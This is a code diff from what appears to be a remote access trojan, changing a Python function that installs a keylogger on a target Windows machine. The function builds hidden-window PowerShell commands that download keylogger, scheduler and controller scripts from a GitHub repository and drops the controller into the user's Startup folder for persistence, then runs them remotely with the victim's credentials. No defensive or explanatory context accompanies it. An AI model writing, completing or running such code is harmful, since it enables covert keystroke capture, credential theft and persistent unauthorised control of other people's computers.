@@ -163,9 +163,7 @@ def keylogger(address, password, target_username, working_directory):
     # set commands-web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/keylogger.ps1 -OutFile {working_directory}/keylogger.ps1\""
     schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/schedule.ps1 -OutFile {working_directory}/schedule.ps1\""
-    
-    controller_command = f'set "STARTUP=C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile %STARTUP%'
-    # move_to_startup = f'powershell mv {working_directory}/controller.cmd "{startup}"'
+    controller_command = f'cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile controller.cmd'
     print("[+] Keylogger Ready")
     
     # execute command
@@ -175,7 +173,6 @@ def keylogger(address, password, target_username, working_directory):
     remote_command(address, password, schedule_command)
     print("[*] Installing Controller")
     remote_command(address, password, controller_command)
-    # remote_command(address, password, move_to_startup)
     
     print("[+] Keylogger Installed Successfully")
 
